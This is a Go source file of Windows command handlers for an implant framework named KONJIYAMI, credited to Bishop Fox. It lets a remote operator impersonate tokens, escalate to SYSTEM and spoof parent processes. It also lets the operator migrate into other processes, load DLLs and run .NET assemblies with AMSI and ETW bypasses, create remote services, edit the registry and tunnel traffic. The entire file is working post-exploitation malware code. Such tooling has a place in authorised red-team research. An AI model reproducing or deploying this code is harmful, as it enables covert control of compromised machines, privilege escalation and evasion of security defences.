package handlers

/*
	KONJIYAMI Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"os"
	"runtime"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"os/exec"
	"syscall"

	"konjiyami/implant/konjiyami/extension"
	"konjiyami/implant/konjiyami/priv"
	"konjiyami/implant/konjiyami/registry"
	"konjiyami/implant/konjiyami/service"
	"konjiyami/implant/konjiyami/spoof"
	"konjiyami/implant/konjiyami/syscalls"
	"konjiyami/implant/konjiyami/taskrunner"
	"konjiyami/protobuf/commonpb"
	"konjiyami/protobuf/konjiyamipb"

	"golang.org/x/sys/windows"
	"google.golang.org/protobuf/proto"
)

var (
	windowsHandlers = map[uint32]RPCHandler{

		// Windows Only
		konjiyamipb.MsgTaskReq:                        taskHandler,
		konjiyamipb.MsgProcessDumpReq:                 dumpHandler,
		konjiyamipb.MsgImpersonateReq:                 impersonateHandler,
		konjiyamipb.MsgRevToSelfReq:                   revToSelfHandler,
		konjiyamipb.MsgRunAsReq:                       runAsHandler,
		konjiyamipb.MsgInvokeGetSystemReq:             getsystemHandler,
		konjiyamipb.MsgInvokeExecuteAssemblyReq:       executeAssemblyHandler,
		konjiyamipb.MsgInvokeInProcExecuteAssemblyReq: inProcExecuteAssemblyHandler,
		konjiyamipb.MsgInvokeMigrateReq:               migrateHandler,
		konjiyamipb.MsgSpawnDllReq:                    spawnDllHandler,
		konjiyamipb.MsgStartServiceReq:                startService,
		konjiyamipb.MsgStopServiceReq:                 stopService,
		konjiyamipb.MsgRemoveServiceReq:               removeService,
		konjiyamipb.MsgEnvReq:                         getEnvHandler,
		konjiyamipb.MsgSetEnvReq:                      setEnvHandler,
		konjiyamipb.MsgUnsetEnvReq:                    unsetEnvHandler,
		konjiyamipb.MsgExecuteWindowsReq:              executeWindowsHandler,
		konjiyamipb.MsgGetPrivsReq:                    getPrivsHandler,
		konjiyamipb.MsgCurrentTokenOwnerReq:           currentTokenOwnerHandler,

		// Platform specific
		konjiyamipb.MsgIfconfigReq:            ifconfigHandler,
		konjiyamipb.MsgScreenshotReq:          screenshotHandler,
		konjiyamipb.MsgSideloadReq:            sideloadHandler,
		konjiyamipb.MsgNetstatReq:             netstatHandler,
		konjiyamipb.MsgMakeTokenReq:           makeTokenHandler,
		konjiyamipb.MsgPsReq:                  psHandler,
		konjiyamipb.MsgTerminateReq:           terminateHandler,
		konjiyamipb.MsgRegistryReadReq:        regReadHandler,
		konjiyamipb.MsgRegistryWriteReq:       regWriteHandler,
		konjiyamipb.MsgRegistryCreateKeyReq:   regCreateKeyHandler,
		konjiyamipb.MsgRegistryDeleteKeyReq:   regDeleteKeyHandler,
		konjiyamipb.MsgRegistrySubKeysListReq: regSubKeysListHandler,
		konjiyamipb.MsgRegistryListValuesReq:  regValuesListHandler,

		// Generic
		konjiyamipb.MsgPing:           pingHandler,
		konjiyamipb.MsgLsReq:          dirListHandler,
		konjiyamipb.MsgDownloadReq:    downloadHandler,
		konjiyamipb.MsgUploadReq:      uploadHandler,
		konjiyamipb.MsgCdReq:          cdHandler,
		konjiyamipb.MsgPwdReq:         pwdHandler,
		konjiyamipb.MsgRmReq:          rmHandler,
		konjiyamipb.MsgMvReq:          mvHandler,
		konjiyamipb.MsgMkdirReq:       mkdirHandler,
		konjiyamipb.MsgExecuteReq:     executeHandler,
		konjiyamipb.MsgReconfigureReq: reconfigureHandler,
		konjiyamipb.MsgSSHCommandReq:  runSSHCommandHandler,
		konjiyamipb.MsgChtimesReq:     chtimesHandler,

		// Extensions
		konjiyamipb.MsgRegisterExtensionReq: registerExtensionHandler,
		konjiyamipb.MsgCallExtensionReq:     callExtensionHandler,
		konjiyamipb.MsgListExtensionsReq:    listExtensionsHandler,

		// {{if .Config.WGc2Enabled}}
		// Wireguard specific
		konjiyamipb.MsgWGStartPortFwdReq:   wgStartPortfwdHandler,
		konjiyamipb.MsgWGStopPortFwdReq:    wgStopPortfwdHandler,
		konjiyamipb.MsgWGListForwardersReq: wgListTCPForwardersHandler,
		konjiyamipb.MsgWGStartSocksReq:     wgStartSocksHandler,
		konjiyamipb.MsgWGStopSocksReq:      wgStopSocksHandler,
		konjiyamipb.MsgWGListSocksReq:      wgListSocksServersHandler,
		// {{end}}
	}
)

// GetSystemHandlers - Returns a map of the windows system handlers
func GetSystemHandlers() map[uint32]RPCHandler {
	return windowsHandlers
}

func WrapperHandler(handler RPCHandler, data []byte, resp RPCResponse) {
	if priv.CurrentToken != 0 {
		err := syscalls.ImpersonateLoggedOnUser(priv.CurrentToken)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Error: %v\n", err)
			// {{end}}
		}
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
	}
	handler(data, resp)
	if priv.CurrentToken != 0 {
		err := priv.TRevertToSelf()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Error: %v\n", err)
			// {{end}}
		}
	}
}

// ---------------- Windows Handlers ----------------

func impersonateHandler(data []byte, resp RPCResponse) {
	impersonateReq := &konjiyamipb.ImpersonateReq{}
	err := proto.Unmarshal(data, impersonateReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	token, err := priv.Impersonate(impersonateReq.Username)
	if err == nil {
		taskrunner.CurrentToken = token
	}
	impersonate := &konjiyamipb.Impersonate{}
	if err != nil {
		impersonate.Response = &commonpb.Response{Err: err.Error()}
	}
	data, err = proto.Marshal(impersonate)
	resp(data, err)
}

func runAsHandler(data []byte, resp RPCResponse) {
	runAsReq := &konjiyamipb.RunAsReq{}
	err := proto.Unmarshal(data, runAsReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	show := 10
	if runAsReq.HideWindow {
		show = 0
	}
	err = priv.RunAs(runAsReq.Username, runAsReq.Domain, runAsReq.Password, runAsReq.ProcessName, runAsReq.Args, show, runAsReq.NetOnly)
	runAs := &konjiyamipb.RunAs{}
	if err != nil {
		runAs.Response = &commonpb.Response{Err: err.Error()}
	}
	data, err = proto.Marshal(runAs)
	resp(data, err)
}

func revToSelfHandler(_ []byte, resp RPCResponse) {
	//{{if .Config.Debug}}
	log.Println("Calling revToSelf...")
	//{{end}}
	taskrunner.CurrentToken = windows.Token(0)
	err := priv.RevertToSelf()
	revToSelf := &konjiyamipb.RevToSelf{}
	if err != nil {
		revToSelf.Response = &commonpb.Response{Err: err.Error()}
	}
	//{{if .Config.Debug}}
	log.Println("revToSelf done!")
	//{{end}}
	data, err := proto.Marshal(revToSelf)
	resp(data, err)
}

func currentTokenOwnerHandler(data []byte, resp RPCResponse) {
	tokOwnReq := &konjiyamipb.CurrentTokenOwnerReq{}
	err := proto.Unmarshal(data, tokOwnReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	getCT := &konjiyamipb.CurrentTokenOwner{}
	owner, err := priv.CurrentTokenOwner()
	if err != nil {
		getCT.Response = &commonpb.Response{Err: err.Error()}
	}
	getCT.Output = owner
	data, err = proto.Marshal(getCT)
	resp(data, err)
}

func getsystemHandler(data []byte, resp RPCResponse) {
	getSysReq := &konjiyamipb.InvokeGetSystemReq{}
	err := proto.Unmarshal(data, getSysReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	err = priv.GetSystem(getSysReq.Data, getSysReq.HostingProcess)
	getSys := &konjiyamipb.GetSystem{}
	if err != nil {
		getSys.Response = &commonpb.Response{Err: err.Error()}
	}
	data, err = proto.Marshal(getSys)
	resp(data, err)
}

func executeAssemblyHandler(data []byte, resp RPCResponse) {
	execReq := &konjiyamipb.InvokeExecuteAssemblyReq{}
	err := proto.Unmarshal(data, execReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	output, err := taskrunner.ExecuteAssembly(execReq.Data, execReq.Process, execReq.ProcessArgs, execReq.PPid)
	execAsm := &konjiyamipb.ExecuteAssembly{Output: []byte(output)}
	if err != nil {
		execAsm.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}
	data, err = proto.Marshal(execAsm)
	resp(data, err)

}

func inProcExecuteAssemblyHandler(data []byte, resp RPCResponse) {
	execReq := &konjiyamipb.InvokeInProcExecuteAssemblyReq{}
	err := proto.Unmarshal(data, execReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	output, err := taskrunner.InProcExecuteAssembly(execReq.Data, execReq.Arguments, execReq.Runtime, execReq.AmsiBypass, execReq.EtwBypass)
	execAsm := &konjiyamipb.ExecuteAssembly{Output: []byte(output)}
	if err != nil {
		execAsm.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}
	data, err = proto.Marshal(execAsm)
	resp(data, err)
}

func executeWindowsHandler(data []byte, resp RPCResponse) {
	var (
		err       error
		stdErr    io.Writer
		stdOut    io.Writer
		errWriter *bufio.Writer
		outWriter *bufio.Writer
	)
	execReq := &konjiyamipb.ExecuteWindowsReq{}
	err = proto.Unmarshal(data, execReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	execResp := &konjiyamipb.Execute{}
	exePath, err := expandPath(execReq.Path)
	if err != nil {
		execResp.Response = &commonpb.Response{
			Err: fmt.Sprintf("%s", err),
		}
		proto.Marshal(execResp)
		resp(data, err)
		return
	}
	cmd := exec.Command(exePath, execReq.Args...)

	// Execute with current token
	cmd.SysProcAttr = &syscall.SysProcAttr{}
	if execReq.UseToken {
		cmd.SysProcAttr.Token = syscall.Token(priv.CurrentToken)
	}
	if execReq.PPid != 0 {
		err := spoof.SpoofParent(execReq.PPid, cmd)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("could not spoof parent PID: %v\n", err)
			// {{end}}
		}
	}

	if execReq.Output {
		stdOutBuff := new(bytes.Buffer)
		stdErrBuff := new(bytes.Buffer)
		stdErr = stdErrBuff
		stdOut = stdOutBuff
		if execReq.Stderr != "" {
			stdErrFile, err := os.Create(execReq.Stderr)
			if err != nil {
				execResp.Response = &commonpb.Response{
					Err: fmt.Sprintf("%s", err),
				}
				proto.Marshal(execResp)
				resp(data, err)
				return
			}
			defer stdErrFile.Close()
			errWriter = bufio.NewWriter(stdErrFile)
			stdErr = io.MultiWriter(errWriter, stdErrBuff)
		}
		if execReq.Stdout != "" {
			stdOutFile, err := os.Create(execReq.Stdout)
			if err != nil {
				execResp.Response = &commonpb.Response{
					Err: fmt.Sprintf("%s", err),
				}
				proto.Marshal(execResp)
				resp(data, err)
				return
			}
			defer stdOutFile.Close()
			outWriter = bufio.NewWriter(stdOutFile)
			stdOut = io.MultiWriter(outWriter, stdOutBuff)
		}
		cmd.Stdout = stdOut
		cmd.Stderr = stdErr
		err := cmd.Run()
		//{{if .Config.Debug}}
		log.Println(string(stdOutBuff.String()))
		//{{end}}
		if err != nil {
			// Exit errors are not a failure of the RPC, but of the command.
			if exiterr, ok := err.(*exec.ExitError); ok {
				execResp.Status = uint32(exiterr.ExitCode())
			} else {
				execResp.Response = &commonpb.Response{
					Err: fmt.Sprintf("%s", err),
				}
			}
		}
		if errWriter != nil {
			errWriter.Flush()
		}
		if outWriter != nil {
			outWriter.Flush()
		}
		execResp.Stderr = stdErrBuff.Bytes()
		execResp.Stdout = stdOutBuff.Bytes()
	} else {
		err = cmd.Start()
		if err != nil {
			execResp.Response = &commonpb.Response{
				Err: fmt.Sprintf("%s", err),
			}
		}
	}
	data, err = proto.Marshal(execResp)
	resp(data, err)
}

func migrateHandler(data []byte, resp RPCResponse) {
	// {{if .Config.Debug}}
	log.Println("migrateHandler: RemoteTask called")
	// {{end}}
	migrateReq := &konjiyamipb.InvokeMigrateReq{}
	err := proto.Unmarshal(data, migrateReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	err = taskrunner.RemoteTask(int(migrateReq.Pid), migrateReq.Data, false)
	// {{if .Config.Debug}}
	log.Println("migrateHandler: RemoteTask called")
	// {{end}}
	migrateResp := &konjiyamipb.Migrate{Success: true}
	if err != nil {
		migrateResp.Success = false
		migrateResp.Response = &commonpb.Response{
			Err: err.Error(),
		}
		// {{if .Config.Debug}}
		log.Println("migrateHandler: RemoteTask failed:", err)
		// {{end}}
	}
	data, err = proto.Marshal(migrateResp)
	resp(data, err)
}

func spawnDllHandler(data []byte, resp RPCResponse) {
	spawnReq := &konjiyamipb.SpawnDllReq{}
	err := proto.Unmarshal(data, spawnReq)

	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	//{{if .Config.Debug}}
	log.Printf("ProcName: %s\tOffset:%x\tArgs:%s\n", spawnReq.GetProcessName(), spawnReq.GetOffset(), spawnReq.GetArgs())
	//{{end}}
	result, err := taskrunner.SpawnDll(spawnReq.GetProcessName(), spawnReq.GetProcessArgs(), spawnReq.GetPPid(), spawnReq.GetData(), spawnReq.GetOffset(), spawnReq.GetArgs(), spawnReq.Kill)
	spawnResp := &konjiyamipb.SpawnDll{Result: result}
	if err != nil {
		spawnResp.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}

	data, err = proto.Marshal(spawnResp)
	resp(data, err)
}

func makeTokenHandler(data []byte, resp RPCResponse) {
	makeTokenReq := &konjiyamipb.MakeTokenReq{}
	err := proto.Unmarshal(data, makeTokenReq)
	if err != nil {
		return
	}
	makeTokenResp := &konjiyamipb.MakeToken{}
	err = priv.MakeToken(makeTokenReq.Domain, makeTokenReq.Username, makeTokenReq.Password, makeTokenReq.LogonType)
	if err != nil {
		makeTokenResp.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}
	data, err = proto.Marshal(makeTokenResp)
	resp(data, err)
}

func startService(data []byte, resp RPCResponse) {
	startService := &konjiyamipb.StartServiceReq{}
	err := proto.Unmarshal(data, startService)
	if err != nil {
		return
	}
	err = service.StartService(startService.GetHostname(), startService.GetBinPath(), startService.GetArguments(), startService.GetServiceName(), startService.GetServiceDescription())
	startServiceResp := &konjiyamipb.ServiceInfo{}
	if err != nil {
		startServiceResp.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}
	data, err = proto.Marshal(startServiceResp)
	resp(data, err)
}

func stopService(data []byte, resp RPCResponse) {
	stopServiceReq := &konjiyamipb.StopServiceReq{}
	err := proto.Unmarshal(data, stopServiceReq)
	if err != nil {
		return
	}
	err = service.StopService(stopServiceReq.ServiceInfo.Hostname, stopServiceReq.ServiceInfo.ServiceName)
	svcInfo := &konjiyamipb.ServiceInfo{}
	if err != nil {
		svcInfo.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}
	data, err = proto.Marshal(svcInfo)
	resp(data, err)
}

func removeService(data []byte, resp RPCResponse) {
	removeServiceReq := &konjiyamipb.RemoveServiceReq{}
	err := proto.Unmarshal(data, removeServiceReq)
	if err != nil {
		return
	}
	err = service.RemoveService(removeServiceReq.ServiceInfo.Hostname, removeServiceReq.ServiceInfo.ServiceName)
	svcInfo := &konjiyamipb.ServiceInfo{}
	if err != nil {
		svcInfo.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}
	data, err = proto.Marshal(svcInfo)
	resp(data, err)
}

func regWriteHandler(data []byte, resp RPCResponse) {
	regWriteReq := &konjiyamipb.RegistryWriteReq{}
	err := proto.Unmarshal(data, regWriteReq)
	if err != nil {
		return
	}
	var val interface{}
	switch regWriteReq.Type {
	case konjiyamipb.RegistryTypeBinary:
		val = regWriteReq.ByteValue
	case konjiyamipb.RegistryTypeDWORD:
		val = regWriteReq.DWordValue
	case konjiyamipb.RegistryTypeQWORD:
		val = regWriteReq.QWordValue
	case konjiyamipb.RegistryTypeString:
		val = regWriteReq.StringValue
	default:
		return
	}
	err = registry.WriteKey(regWriteReq.Hostname, regWriteReq.Hive, regWriteReq.Path, regWriteReq.Key, val)
	regWriteResp := &konjiyamipb.RegistryWrite{
		Response: &commonpb.Response{},
	}
	if err != nil {
		regWriteResp.Response.Err = err.Error()
	}
	data, err = proto.Marshal(regWriteResp)
	resp(data, err)
}

func regReadHandler(data []byte, resp RPCResponse) {
	regReadReq := &konjiyamipb.RegistryReadReq{}
	err := proto.Unmarshal(data, regReadReq)
	if err != nil {
		return
	}
	res, err := registry.ReadKey(regReadReq.Hostname, regReadReq.Hive, regReadReq.Path, regReadReq.Key)
	regReadResp := &konjiyamipb.RegistryRead{
		Value:    res,
		Response: &commonpb.Response{},
	}
	if err != nil {
		regReadResp.Response.Err = err.Error()
	}
	data, err = proto.Marshal(regReadResp)
	resp(data, err)
}

func regCreateKeyHandler(data []byte, resp RPCResponse) {
	createReq := &konjiyamipb.RegistryCreateKeyReq{}
	err := proto.Unmarshal(data, createReq)
	if err != nil {
		return
	}
	err = registry.CreateSubKey(createReq.Hostname, createReq.Hive, createReq.Path, createReq.Key)
	createResp := &konjiyamipb.RegistryCreateKey{
		Response: &commonpb.Response{},
	}
	if err != nil {
		createResp.Response.Err = err.Error()
	}
	data, err = proto.Marshal(createResp)
	resp(data, err)
}

func regDeleteKeyHandler(data []byte, resp RPCResponse) {
	deleteReq := &konjiyamipb.RegistryDeleteKeyReq{}
	err := proto.Unmarshal(data, deleteReq)
	if err != nil {
		return
	}
	err = registry.DeleteKey(deleteReq.Hostname, deleteReq.Hive, deleteReq.Path, deleteReq.Key)
	deleteResp := &konjiyamipb.RegistryDeleteKey{
		Response: &commonpb.Response{},
	}
	if err != nil {
		deleteResp.Response.Err = err.Error()
	}
	data, err = proto.Marshal(deleteResp)
	resp(data, err)
}

func regSubKeysListHandler(data []byte, resp RPCResponse) {
	listReq := &konjiyamipb.RegistrySubKeyListReq{}
	err := proto.Unmarshal(data, listReq)
	if err != nil {
		return
	}
	subKeys, err := registry.ListSubKeys(listReq.Hostname, listReq.Hive, listReq.Path)
	regListResp := &konjiyamipb.RegistrySubKeyList{
		Response: &commonpb.Response{},
	}
	if err != nil {
		regListResp.Response.Err = err.Error()
	} else {
		regListResp.Subkeys = subKeys
	}
	data, err = proto.Marshal(regListResp)
	resp(data, err)
}

func regValuesListHandler(data []byte, resp RPCResponse) {
	listReq := &konjiyamipb.RegistryListValuesReq{}
	err := proto.Unmarshal(data, listReq)
	if err != nil {
		return
	}
	regValues, err := registry.ListValues(listReq.Hostname, listReq.Hive, listReq.Path)
	regListResp := &konjiyamipb.RegistryValuesList{
		Response: &commonpb.Response{},
	}
	if err != nil {
		regListResp.Response.Err = err.Error()
	} else {
		regListResp.ValueNames = regValues
	}
	data, err = proto.Marshal(regListResp)
	resp(data, err)
}

func getPrivsHandler(data []byte, resp RPCResponse) {
	createReq := &konjiyamipb.GetPrivsReq{}

	err := proto.Unmarshal(data, createReq)
	if err != nil {
		return
	}

	privsInfo, integrity, processName, err := priv.GetPrivs()

	response_data := make([]*konjiyamipb.WindowsPrivilegeEntry, len(privsInfo))

	/*
		Translate the PrivilegeInfo structs into
		konjiyamipb.WindowsPrivilegeEntry structs and put them in the data
		that will go back to the server / client
	*/
	for index, entry := range privsInfo {
		var currentEntry konjiyamipb.WindowsPrivilegeEntry

		currentEntry.Name = entry.Name
		currentEntry.Description = entry.Description
		currentEntry.Enabled = entry.Enabled
		currentEntry.EnabledByDefault = entry.EnabledByDefault
		currentEntry.Removed = entry.Removed
		currentEntry.UsedForAccess = entry.UsedForAccess

		response_data[index] = &currentEntry
	}

	// Package up the response
	getPrivsResp := &konjiyamipb.GetPrivs{
		PrivInfo:         response_data,
		ProcessIntegrity: integrity,
		ProcessName:      processName,
		Response:         &commonpb.Response{},
	}

	if err != nil {
		getPrivsResp.Response.Err = err.Error()
	}

	data, err = proto.Marshal(getPrivsResp)
	resp(data, err)
}

// Extensions

func registerExtensionHandler(data []byte, resp RPCResponse) {
	registerReq := &konjiyamipb.RegisterExtensionReq{}
	err := proto.Unmarshal(data, registerReq)
	if err != nil {
		return
	}
	ext := extension.NewWindowsExtension(registerReq.Data, registerReq.Name, registerReq.OS, registerReq.Init)
	err = ext.Load()
	registerResp := &konjiyamipb.RegisterExtension{Response: &commonpb.Response{}}
	if err != nil {
		registerResp.Response.Err = err.Error()
	} else {
		extension.Add(ext)
	}
	data, err = proto.Marshal(registerResp)
	resp(data, err)
}

func callExtensionHandler(data []byte, resp RPCResponse) {
	callReq := &konjiyamipb.CallExtensionReq{}
	err := proto.Unmarshal(data, callReq)
	if err != nil {
		return
	}

	callResp := &konjiyamipb.CallExtension{Response: &commonpb.Response{}}
	gotOutput := false
	err = extension.Run(callReq.Name, callReq.Export, callReq.Args, func(out []byte) {
		gotOutput = true
		callResp.Output = out
		data, err = proto.Marshal(callResp)
		resp(data, err)
	})
	// Only send back synchronously if there was an error
	if err != nil || !gotOutput {
		if err != nil {
			callResp.Response.Err = err.Error()
		}
		data, err = proto.Marshal(callResp)
		resp(data, err)
	}
}

func listExtensionsHandler(data []byte, resp RPCResponse) {
	lstReq := &konjiyamipb.ListExtensionsReq{}
	err := proto.Unmarshal(data, lstReq)
	if err != nil {
		return
	}

	exts := extension.List()
	lstResp := &konjiyamipb.ListExtensions{
		Response: &commonpb.Response{},
		Names:    exts,
	}
	data, err = proto.Marshal(lstResp)
	resp(data, err)
}

// Stub since Windows doesn't support UID
func getUid(fileInfo os.FileInfo) (string) {
	return ""
}

// Stub since Windows doesn't support GID
func getGid(fileInfo os.FileInfo) (string) {
    return ""
}

